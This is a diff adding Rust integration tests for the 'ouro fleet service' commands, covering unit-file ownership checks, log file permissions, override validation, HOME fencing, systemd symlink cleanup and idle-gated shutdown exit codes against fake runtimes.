+/// F13c (L6). A directory where the unit goes gets its own code, and nothing inside it
+/// is disturbed.
+#[test]
+fn f13c_a_directory_where_the_unit_goes_is_named_rather_than_clobbered() {
+    let root = scratch("dir-unit");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
+    fs::create_dir_all(plan.unit_path()).expect("a directory where the unit goes");
+    fs::write(plan.unit_path().join("inside"), "stuff").expect("something inside it");
+
+    assert_eq!(
+        fleet_service::classify(&plan).expect("a classification").0,
+        Ownership::Foreign
+    );
+    let error = fleet_service::install(&plan, &fakes.programs, true).expect_err("a directory");
+    assert_eq!(
+        fleet_service::service_error(&error).map(|declared| declared.reason),
+        Some("unit_path_is_a_directory")
+    );
+    assert!(plan.unit_path().join("inside").exists());
+    // And no temporary file was left in the agents directory.
+    let strays = fs::read_dir(plan.unit_path().parent().expect("an agents dir"))
+        .expect("a listing")
+        .flatten()
+        .filter(|entry| entry.file_name().to_string_lossy().starts_with('.'))
+        .count();
+    assert_eq!(strays, 0);
+}
+
+/// F14. A manager override that is not an executable file is refused by name, rather
+/// than silently falling through to `PATH`.
+#[test]
+fn f14_a_manager_override_that_is_not_a_program_is_refused_by_name() {
+    let root = scratch("from-env");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let home = root.join("home");
+    fs::create_dir_all(&home).expect("a scratch home");
+
+    for (value, why) in [
+        (root.display().to_string(), "a directory"),
+        ("relative/launchctl".to_string(), "a relative path"),
+        ("/does/not/exist/launchctl".to_string(), "a missing file"),
+    ] {
+        let output = Command::new(OURO)
+            .args(["fleet", "service", "status"])
+            .env("OUROBOROS_DATA_DIR", &data_dir)
+            .env("HOME", &home)
+            .env("OUROBOROS_SERVICE_ROOT", &home)
+            .env("OUROBOROS_LAUNCHCTL", &value)
+            .output()
+            .expect("the built ouro binary");
+        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+        assert!(!output.status.success(), "{why} (`{value}`) was accepted");
+        assert!(
+            stderr.contains("OUROBOROS_LAUNCHCTL") && stderr.contains(&value),
+            "{why}: {stderr}"
+        );
+    }
+}
+
+/// F15. A runtime already owning the data directory is a fact the operator is owed.
+#[test]
+fn f15_install_says_when_a_runtime_already_owns_this_data_directory() {
+    let root = scratch("unmanaged");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let mut child = Command::new("/bin/sh")
+        .args(["-c", "while :; do sleep 1; done"])
+        .stdin(Stdio::null())
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .spawn()
+        .expect("a stand-in runtime");
+    let pid = child.id() as i32;
+    let birth = ouro::runtime::process_birth(pid)
+        .expect("a readable incarnation")
+        .expect("a live stand-in");
+    write_private(
+        &data_dir.join("runtime.owner"),
+        &format!(r#"{{"pid":{pid},"owner":"someone","birth":"{birth}"}}"#),
+    );
+
+    let fakes = Fakes::install(&root);
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
+    let report = fleet_service::install(&plan, &fakes.programs, false).expect("an install");
+
+    assert!(
+        report
+            .notes
+            .iter()
+            .any(|note| note.contains("already owns") && note.contains(&pid.to_string())),
+        "{:?}",
+        report.notes
+    );
+    assert!(fleet_service::render(&report).contains("already owns"));
+    let _ = child.kill();
+    let _ = child.wait();
+}
+
+/// F17/L1. The marker is forgeable and says so. This pins both halves: the behaviour,
+/// and the sentence in the documentation that stops anybody reading it as a boundary.
+#[test]
+fn f17_the_marker_is_not_a_security_boundary_and_the_documentation_says_so() {
+    let root = scratch("forged");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
+
+    // Anything that can write the unit path can compute the marker: it is a digest over
+    // the file with no secret in it. The classification is therefore `Ours`.
+    fleet_service::install(&plan, &fakes.programs, false).expect("an install");
+    let ours = fs::read_to_string(plan.unit_path()).expect("our unit");
+    assert_eq!(
+        fleet_service::classify(&plan).expect("a classification").0,
+        Ownership::Ours
+    );
+    let _ = ours;
+
+    // So the documentation has to say what it does and does not distinguish.
+    let fleet_md = Path::new(env!("CARGO_MANIFEST_DIR"))
+        .join("..")
+        .join("docs")
+        .join("FLEET.md");
+    let text = fs::read_to_string(&fleet_md).expect("docs/FLEET.md");
+    assert!(
+        text.contains("not a security boundary"),
+        "docs/FLEET.md must say the ownership marker is not a security boundary"
+    );
+    assert!(
+        text.contains("write access"),
+        "and must say what it does not defend against"
+    );
+}
+
+/// F18/L2/M17. The service's own logs are private, and stay private: recreated when
+/// rotation removed them, and re-privatised when something created them world-readable.
+#[test]
+fn f18_the_service_logs_are_put_back_private_by_the_verbs_that_touch_them() {
+    let root = scratch("log-rotate");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
+    fleet_service::install(&plan, &fakes.programs, false).expect("an install");
+    assert_eq!(mode(&plan.err_log()), 0o600);
+
+    // Log rotation, or an operator clearing space.
+    fs::remove_file(plan.err_log()).expect("a rotated log");
+    fs::remove_file(plan.out_log()).expect("a rotated log");
+    let report = fleet_service::status(&plan, &fakes.programs).expect("a status");
+    assert!(
+        plan.err_log().exists(),
+        "status must put a missing log back"
+    );
+    assert_eq!(mode(&plan.err_log()), 0o600);
+    assert!(
+        report.notes.iter().any(|note| note.contains("recreated")),
+        "{:?}",
+        report.notes
+    );
+
+    fs::remove_file(plan.err_log()).expect("a rotated log");
+    fleet_service::start(&plan, &fakes.programs).expect("a start");
+    assert_eq!(mode(&plan.err_log()), 0o600);
+
+    // A log the manager created at its own umask is made private again.
+    fs::set_permissions(plan.err_log(), fs::Permissions::from_mode(0o644))
+        .expect("a world-readable log");
+    fleet_service::install(&plan, &fakes.programs, false).expect("a reinstall");
+    assert_eq!(
+        mode(&plan.err_log()),
+        0o600,
+        "an existing log is re-privatised, not trusted"
+    );
+}
+
+/// F19/L5. Whose lingering is reported comes from the password database, not from an
+/// environment variable anybody can set.
+#[test]
+fn f19_the_account_is_the_real_one_and_not_whatever_user_says() {
+    let root = scratch("linger-user");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+    let home = root.join("home");
+    fs::create_dir_all(&home).expect("a scratch home");
+
+    let real = Command::new("/usr/bin/id")
+        .arg("-un")
+        .output()
+        .expect("id -un");
+    let real = String::from_utf8_lossy(&real.stdout).trim().to_string();
+
+    let output = Command::new(OURO)
+        .args(["fleet", "service", "status", "--json"])
+        .env("OUROBOROS_DATA_DIR", &data_dir)
+        .env("HOME", &home)
+        .env("OUROBOROS_SERVICE_ROOT", &home)
+        .env("USER", "somebody-else")
+        .env("LOGNAME", "somebody-else")
+        .env("OUROBOROS_LAUNCHCTL", &fakes.programs.launchctl)
+        .env("OUROBOROS_SYSTEMCTL", &fakes.programs.systemctl)
+        .env("OUROBOROS_LOGINCTL", &fakes.programs.loginctl)
+        .output()
+        .expect("the built ouro binary");
+    assert!(
+        output.status.success(),
+        "{}",
+        String::from_utf8_lossy(&output.stderr)
+    );
+
+    let report: Value = serde_json::from_slice(&output.stdout).expect("a JSON report");
+    assert!(!real.is_empty(), "this machine has an account name");
+    assert_eq!(
+        report["user"].as_str(),
+        Some(real.as_str()),
+        "the report names the account this process actually runs as: {report}"
+    );
+    assert!(
+        !serde_json::to_string(&report)
+            .expect("encodable")
+            .contains("somebody-else"),
+        "an account named only by the environment reached the report: {report}"
+    );
+}
+
+/// M3 (mutation survivor). Our own marker, naming a *different* data directory, is
+/// another runtime's unit and not ours to rewrite or delete.
+#[test]
+fn m3_our_marker_for_another_data_directory_is_foreign() {
+    let root = scratch("other-marker");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let other = data_dir_with_profile(&root.join("other"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
+
+    let mut theirs = plan.clone();
+    theirs.data_dir = other.clone();
+    let unit = plan.unit_path();
+    fs::create_dir_all(unit.parent().expect("an agents dir")).expect("an agents dir");
+    let text = theirs.render().expect("their unit");
+    fs::write(&unit, &text).expect("their unit at our path");
+
+    assert_eq!(
+        fleet_service::classify(&plan).expect("a classification").0,
+        Ownership::Foreign,
+        "a marker naming {} is not a marker naming {}",
+        other.display(),
+        data_dir.display()
+    );
+    fleet_service::remove(&plan, &fakes.programs).expect_err("not ours");
+    assert_eq!(fs::read_to_string(&unit).expect("theirs"), text);
+    fleet_service::install(&plan, &fakes.programs, false).expect_err("not ours");
+    assert_eq!(fs::read_to_string(&unit).expect("theirs"), text);
+}
+
+/// M10/M11 (mutation survivors). `remove` on nothing, `remove` on an edited unit, and
+/// `disable` on somebody else's.
+#[test]
+fn m10_remove_and_disable_act_only_on_what_is_actually_there() {
+    let root = scratch("ownership-verbs");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
+
+    // Nothing installed: a removal is a report, not a failure, and unlinks nothing.
+    let report = fleet_service::remove(&plan, &fakes.programs).expect("a removal of nothing");
+    assert_eq!(report.ownership, Ownership::Absent);
+    assert!(
+        report
+            .notes
+            .iter()
+            .any(|note| note.contains("did not exist")),
+        "{:?}",
+        report.notes
+    );
+    assert!(
+        !report.steps.iter().any(|step| step.starts_with("removed ")),
+        "nothing was there to remove: {:?}",
+        report.steps
+    );
+
+    // Somebody else's file: `disable` will not stop what it supervises.
+    let unit = plan.unit_path();
+    fs::create_dir_all(unit.parent().expect("an agents dir")).expect("an agents dir");
+    fs::write(&unit, "<plist/>\n").expect("a foreign unit");
+    let error = fleet_service::disable(&plan, &fakes.programs).expect_err("not ours to stop");
+    assert_eq!(
+        fleet_service::service_error(&error).map(|declared| declared.reason),
+        Some("unit_foreign")
+    );
+    assert_eq!(fs::read_to_string(&unit).expect("theirs"), "<plist/>\n");
+
+    // Ours, edited: `disable` is still allowed — stopping is reversible.
+    fs::remove_file(&unit).expect("a removable foreign unit");
+    fleet_service::install(&plan, &fakes.programs, false).expect("an install");
+    let ours = fs::read_to_string(&unit).expect("our unit");
+    fs::write(
+        &unit,
+        ours.replace("<integer>30</integer>", "<integer>7</integer>"),
+    )
+    .expect("an edit");
+    let report = fleet_service::disable(&plan, &fakes.programs).expect("a disable");
+    assert_eq!(report.ownership, Ownership::Modified);
+    assert!(unit.exists(), "disable keeps the file");
+}
+
+/// M24 (mutation survivor). The unit file is still on disk at the moment the manager is
+/// told to stop supervising it — the fakes record what they saw, so the order is
+/// observed rather than asserted from the report.
+#[test]
+fn m24_the_unit_is_still_there_when_the_manager_is_told_to_stop_it() {
+    let root = scratch("order");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
+    fakes.watch(&plan);
+    fleet_service::install(&plan, &fakes.programs, false).expect("an install");
+
+    fakes.forget_calls();
+    let report = fleet_service::remove(&plan, &fakes.programs).expect("a removal");
+
+    let bootout = fakes
+        .calls()
+        .into_iter()
+        .find(|call| call.contains("bootout"))
+        .expect("a bootout");
+    assert!(
+        bootout.ends_with("[unit=yes]"),
+        "the unit was unlinked before its manager was told: {bootout}"
+    );
+    // And the report's own ordered log agrees.
+    let ran = report
+        .steps
+        .iter()
+        .position(|step| step.contains("bootout"))
+        .expect("a recorded bootout");
+    let removed = report
+        .steps
+        .iter()
+        .position(|step| step.starts_with("removed "))
+        .expect("a recorded removal");
+    assert!(ran < removed, "{:?}", report.steps);
+}
+
+/// F21 (M7). Adopting a foreign plist boots out the job *that* plist loaded as well as
+/// ours, so nothing is left running with no file behind it.
+#[test]
+fn f21_adopting_a_foreign_plist_boots_out_the_job_it_had_loaded() {
+    let root = scratch("adopt-orphan");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+    let plan = plan_for(Platform::MacOs, &root, &data_dir);
+
+    let unit = plan.unit_path();
+    fs::create_dir_all(unit.parent().expect("an agents dir")).expect("an agents dir");
+    fs::write(
+        &unit,
+        "<?xml version=\"1.0\"?>\n<plist version=\"1.0\"><dict>\n<key>Label</key><string>com.example.other</string>\n<key>ProgramArguments</key><array><string>/usr/bin/true</string></array>\n<key>RunAtLoad</key><true/>\n</dict></plist>\n",
+    )
+    .expect("a foreign plist with its own label");
+
+    fakes.forget_calls();
+    let report = fleet_service::install(&plan, &fakes.programs, true).expect("an adopted install");
+
+    let issued = format!("{:?}", report.commands);
+    assert!(issued.contains(&plan.label()), "{issued}");
+    assert!(
+        issued.contains("com.example.other"),
+        "the job the replaced file loaded has to be booted out too: {issued}"
+    );
+    assert!(
+        report
+            .notes
+            .iter()
+            .any(|note| note.contains("com.example.other")),
+        "and named, so an operator knows what was stopped: {:?}",
+        report.notes
+    );
+    // A label that is not a plausible launchd label is never handed to `launchctl`.
+    fs::write(
+        &unit,
+        "<plist><dict><key>Label</key><string>two words</string></dict></plist>\n",
+    )
+    .expect("an implausible label");
+    fakes.forget_calls();
+    let report = fleet_service::install(&plan, &fakes.programs, true).expect("an adopted install");
+    assert!(
+        !format!("{:?}", report.commands).contains("two words"),
+        "{:?}",
+        report.commands
+    );
+}
+
+// ------------------------------------------------------------- the idle gate, adversarially
+
+/// F20 (M5). A runtime that does not serve `runtime.activity` has no gate to apply, and
+/// is refused rather than stopped. Nothing is sent.
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn f20_a_runtime_without_the_activity_method_is_refused_not_stopped() {
+    let root = scratch("stop-old-runtime");
+    let (listener, address) = support::listener().await;
+    let runtime = FakeRuntime::new(&root, address.port());
+
+    let token = runtime.token.clone();
+    let server = tokio::spawn(async move {
+        let mut peer = support::Peer::accept(&listener).await;
+        // No `runtime.activity`: this runtime has no idea what an idle gate is.
+        peer.hello_with_token(&token, &["hello", "runtime.shutdown"])
+            .await;
+        // Anything arriving here is a request that should never have been sent.
+        if let Some(request) = peer.request().await {
+            panic!("a request reached a runtime with no gate: {request}");
+        }
+    });
+
+    let child = run_stop(&runtime, &["stop", "--require-idle"]).await;
+    let (code, _stdout, stderr) = finish(child).await;
+    server.abort();
+
+    assert_eq!(code, Some(12), "stderr: {stderr}");
+    assert!(stderr.contains("runtime.activity"), "{stderr}");
+    assert!(stderr.contains("Nothing was sent"), "{stderr}");
+    assert!(
+        ouro::runtime::pid_alive(runtime.child.id() as i32),
+        "nothing was stopped"
+    );
+}
+
+/// F10 (L3). The JSON-RPC code is half the contract. A `reason` carried on some other
+/// error is not the idle refusal and must not be reported as one.
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn f10_a_reason_on_the_wrong_error_code_is_not_the_idle_refusal() {
+    let root = scratch("stop-wrong-code");
+    let (listener, address) = support::listener().await;
+    let runtime = FakeRuntime::new(&root, address.port());
+
+    let token = runtime.token.clone();
+    let server = tokio::spawn(async move {
+        let mut peer = support::Peer::accept(&listener).await;
+        peer.hello_with_token(&token, &["hello", "runtime.shutdown", "runtime.activity"])
+            .await;
+        let request = peer.request().await.expect("a shutdown call");
+        // -32601 is "method not found", not the contract's -32004.
+        peer.error(
+            &request["id"],
+            -32601,
+            "no such method",
+            Some(json!({ "reason": "runtime_busy", "activity": "not an object at all" })),
+        )
+        .await;
+        tokio::time::sleep(Duration::from_secs(2)).await;
+    });
+
+    let child = run_stop(&runtime, &["stop", "--require-idle"]).await;
+    let (code, _stdout, stderr) = finish(child).await;
+    server.abort();
+
+    assert_eq!(
+        code,
+        Some(1),
+        "an ordinary failure, not a busy runtime: {stderr}"
+    );
+    assert_ne!(code, Some(10));
+    assert!(stderr.contains("runtime.shutdown failed"), "{stderr}");
+}
+
+/// F11 (L4). A connection that closes instead of answering an idle-gated stop leaves an
+/// outcome nobody knows, and says so with its own exit code.
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn f11_a_connection_dropped_mid_gate_is_an_unknown_outcome() {
+    let root = scratch("stop-dropped");
+    let (listener, address) = support::listener().await;
+    let runtime = FakeRuntime::new(&root, address.port());
+
+    let token = runtime.token.clone();
+    let server = tokio::spawn(async move {
+        let mut peer = support::Peer::accept(&listener).await;
+        peer.hello_with_token(&token, &["hello", "runtime.shutdown", "runtime.activity"])
+            .await;
+        let _request = peer.request().await.expect("a shutdown call");
+        // ...and then simply go away without answering.
+        drop(peer);
+    });
+
+    let child = run_stop(&runtime, &["stop", "--require-idle"]).await;
+    let (code, stdout, stderr) = finish(child).await;
+    server.abort();
+
+    assert_eq!(code, Some(13), "stdout: {stdout}\nstderr: {stderr}");
+    assert!(stderr.contains("unknown"), "{stderr}");
+    assert!(
+        !stdout.contains("accepted runtime.shutdown"),
+        "a dropped connection is not an acceptance: {stdout}"
+    );
+
+    // A plain `ouro stop` keeps its old meaning: the runtime may well stop before it can
+    // answer, and that is the thing that was asked for.
+    let (listener, address) = support::listener().await;
+    let plain_root = scratch("stop-dropped-plain");
+    let mut plain = FakeRuntime::new(&plain_root, address.port());
+    let token = plain.token.clone();
+    let (closed, closing) = tokio::sync::oneshot::channel();
+    let server = tokio::spawn(async move {
+        let mut peer = support::Peer::accept(&listener).await;
+        peer.hello_with_token(&token, &["hello", "runtime.shutdown"])
+            .await;
+        let _request = peer.request().await.expect("a shutdown call");
+        drop(peer);
+        let _ = closed.send(());
+    });
+    let child = run_stop(&plain, &["stop"]).await;
+    closing.await.expect("a closed connection");
+    plain.stop_child();
+    let (code, stdout, _stderr) = finish(child).await;
+    server.abort();
+    assert_eq!(code, Some(0));
+    assert!(stdout.contains("closed the connection"), "{stdout}");
+}
+
+/// F16. A refusal answered to a *plain* stop is still a failure, not a swallowed one.
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn f16_a_refusal_answered_to_a_plain_stop_is_not_swallowed() {
+    let root = scratch("stop-plain-refusal");
+    let (listener, address) = support::listener().await;
+    let runtime = FakeRuntime::new(&root, address.port());
+
+    let token = runtime.token.clone();
+    let server = tokio::spawn(async move {
+        let mut peer = support::Peer::accept(&listener).await;
+        peer.hello_with_token(&token, &["hello", "runtime.shutdown", "runtime.activity"])
+            .await;
+        let request = peer.request().await.expect("a shutdown call");
+        assert_eq!(
+            request["params"],
+            json!({}),
+            "a plain stop sends no parameter"
+        );
+        peer.error(
+            &request["id"],
+            -32004,
+            "this node is still working",
+            Some(json!({ "reason": "runtime_busy", "activity": { "running_turns": 1 } })),
+        )
+        .await;
+        tokio::time::sleep(Duration::from_secs(2)).await;
+    });
+
+    let child = run_stop(&runtime, &["stop"]).await;
+    let (code, _stdout, stderr) = finish(child).await;
+    server.abort();
+
+    // Not 10: the gate was never asked for, so this is an ordinary refusal to report.
+    assert_eq!(code, Some(1), "{stderr}");
+    assert!(stderr.contains("runtime.shutdown failed"), "{stderr}");
+    assert!(ouro::runtime::pid_alive(runtime.child.id() as i32));
+}
+
+/// L8. `systemctl --user enable` installs a `default.target.wants` symlink. Removing the
+/// unit without taking that out leaves a dangling want for every later `daemon-reload`
+/// to complain about — and on a machine whose user manager is not answering there is
+/// nothing else left to clean it up.
+#[test]
+fn l8_remove_takes_out_the_wants_symlink_systemd_left_behind() {
+    for reachable in [true, false] {
+        let root = scratch("wants");
+        let data_dir = data_dir_with_profile(&root.join("data"), "buildbox", "127.0.0.1");
+        let fakes = Fakes::install(&root);
+        let plan = plan_for(Platform::Linux, &root, &data_dir);
+        fleet_service::install(&plan, &fakes.programs, false).expect("an install");
+
+        // Exactly what the real `enable` leaves behind.
+        let wants = plan
+            .config_home
+            .join("systemd")
+            .join("user")
+            .join("default.target.wants");
+        fs::create_dir_all(&wants).expect("a wants directory");
+        let want = wants.join(plan.manager_name());
+        std::os::unix::fs::symlink(plan.unit_path(), &want).expect("an enable symlink");
+
+        if !reachable {
+            fakes.set("no_manager", true);
+        }
+        let report = fleet_service::remove(&plan, &fakes.programs).expect("a removal");
+
+        assert!(
+            fs::symlink_metadata(&want).is_err(),
+            "reachable={reachable}: {} is still there",
+            want.display()
+        );
+        assert!(
+            report
+                .notes
+                .iter()
+                .any(|note| note.contains("default.target.wants")),
+            "reachable={reachable}: {:?}",
+            report.notes
+        );
+        assert!(!plan.unit_path().exists());
+    }
+}
+
+/// H0. The property the whole fix rests on: this binary writes its unit under the `HOME`
+/// it was given, and refuses outright to write outside the root it was fenced to.
+#[test]
+fn h0_a_child_writes_its_unit_under_the_home_it_was_given_and_nowhere_else() {
+    let root = scratch("home-fence");
+    let data_dir = data_dir_with_profile(&root.join("data"), "studio", "127.0.0.1");
+    let fakes = Fakes::install(&root);
+    let home = root.join("home");
+    fs::create_dir_all(&home).expect("a scratch home");
+
+    // The unit path follows `$HOME`, not the account's own home directory.
+    let output = Command::new(OURO)
+        .args(["fleet", "service", "status", "--json"])
+        .env("OUROBOROS_DATA_DIR", &data_dir)
+        .env("HOME", &home)
+        .env("OUROBOROS_SERVICE_ROOT", &home)
+        .env("OUROBOROS_LAUNCHCTL", &fakes.programs.launchctl)
+        .env("OUROBOROS_SYSTEMCTL", &fakes.programs.systemctl)
+        .env("OUROBOROS_LOGINCTL", &fakes.programs.loginctl)
+        .output()
+        .expect("the built ouro binary");
+    assert!(
+        output.status.success(),
+        "{}",
+        String::from_utf8_lossy(&output.stderr)
+    );
+    let report: Value = serde_json::from_slice(&output.stdout).expect("a JSON report");
+    let unit_path = report["unit_path"]
+        .as_str()
+        .expect("a unit path")
+        .to_string();
+    assert!(
+        unit_path.starts_with(&home.display().to_string()),
+        "a child told where its home is wrote to {unit_path}"
+    );
+    let real_home = dirs::home_dir().expect("a home directory");
+    assert!(
+        !unit_path.starts_with(&real_home.display().to_string()),
+        "{unit_path} is inside the account's own home"
+    );
+
+    // And a home outside the fence is refused rather than written. This is the second,
+    // independent guard: it does not care how the home was decided.
+    let elsewhere = scratch("home-outside-fence");
+    let output = Command::new(OURO)
+        .args(["fleet", "service", "install"])
+        .env("OUROBOROS_DATA_DIR", &data_dir)
+        .env("HOME", &elsewhere)
+        .env("OUROBOROS_SERVICE_ROOT", &home)
+        .env("OUROBOROS_LAUNCHCTL", &fakes.programs.launchctl)
+        .env("OUROBOROS_SYSTEMCTL", &fakes.programs.systemctl)
+        .env("OUROBOROS_LOGINCTL", &fakes.programs.loginctl)
+        .output()
+        .expect("the built ouro binary");
+    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+    assert!(!output.status.success(), "{stderr}");
+    assert!(stderr.contains("OUROBOROS_SERVICE_ROOT"), "{stderr}");
+    assert_eq!(
+        fs::read_dir(elsewhere.join("Library").join("LaunchAgents"))
+            .map(|entries| entries.count())
+            .unwrap_or(0),
+        0,
+        "the fence has to refuse before anything is written"
     );
 }
